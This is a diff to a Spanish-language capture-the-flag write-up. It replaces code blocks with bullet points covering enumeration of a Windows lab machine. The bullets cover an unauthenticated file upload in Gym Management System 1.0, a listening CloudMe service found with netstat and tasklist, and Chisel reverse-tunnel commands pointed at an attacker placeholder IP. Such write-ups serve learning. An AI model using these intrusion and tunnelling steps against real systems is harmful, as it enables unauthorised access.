@@ -38,23 +38,9 @@ La web es «mrb3n's Bro Hut», un sitio de gimnasio con `packages.php`, `facilit
 
 ## Enumeración
 
-```bash
-netstat -ano | findstr LISTENING
-```
-
-```text
-127.0.0.1:8888   CloudMe
-```
-
-CloudMe solo escucha en loopback, así que hay que traerlo al atacante. Con Chisel:
-
-```bash
-# atacante
-./chisel server -p 8000 --reverse
-
-# víctima
-.\chisel.exe client <IP_ATACANTE>:8000 R:8888:127.0.0.1:8888
-```
+- `8080/tcp` sirve Apache/PHP 7.4.6 con «mrb3n's Bro Hut»; el HTML y los pies revelan **Gym Management System 1.0**, con `upload.php` sin autenticación (Exploit-DB 48506: doble extensión y bytes de PNG).
+- Tras la shell como `shaun`, `netstat -ano | findstr LISTENING` muestra `127.0.0.1:8888` y `3306`; `tasklist /v | findstr <pid>` identifica **`CloudMe.exe`** en el 8888.
+- El servicio solo escucha en loopback: hay que reenviarlo con **Chisel** (`chisel client <IP>:<port> R:8888:127.0.0.1:8888`) antes de lanzar el exploit.
 
 ## Foothold
 
